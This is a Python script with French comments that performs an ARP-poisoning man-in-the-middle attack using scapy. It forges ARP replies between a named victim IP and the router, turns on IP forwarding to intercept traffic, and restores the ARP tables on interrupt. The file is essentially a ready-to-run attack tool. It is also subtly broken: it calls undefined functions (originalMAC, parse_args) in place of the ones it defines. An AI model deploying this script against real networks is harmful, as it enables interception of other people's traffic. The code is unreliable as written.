# Permet de faire une attaque de type ARP-POISONING
# Usage:  python arp.py -v 192.168.0.5 -r 192.168.0.1
#
# Inspiré fortement de http://danmcinerney.org/arp-poisoning-with-python-2/

#!/usr/bin/python
from scapy.all import *
import argparse
import signal
import sys
import logging
import time
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victimIP", help="Choisisez le IP de la victime Exemple: -v 192.168.0.5")
    parser.add_argument("-r", "--routerIP", help="Choisisez le IP du routeur Exemple: -r 192.168.0.1")
    return parser.parse_args()

def MAC_Original(ip):
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
    for s,r in ans:
        return r[Ether].src

def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
    sys.exit("Arrêt de l'attaque...")

def main(args):
    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")
    routerIP = args.routerIP
    victimIP = args.victimIP
    routerMAC = originalMAC(args.routerIP)
    victimMAC = originalMAC(args.victimIP)
    
    if routerMAC == None:
        sys.exit("Impossible de trouver le MAC du routeur...fermeture")
    if victimMAC == None:
        sys.exit("Impossible de trouver le MAC de la victime...fermeture")
    
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('1\n')
    def signal_handler(signal, frame):
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
            ipf.write('0\n')
        restore(routerIP, victimIP, routerMAC, victimMAC)
    signal.signal(signal.SIGINT, signal_handler)
    while 1:
        poison(routerIP, victimIP, routerMAC, victimMAC)
        time.sleep(1.5)

main(parse_args())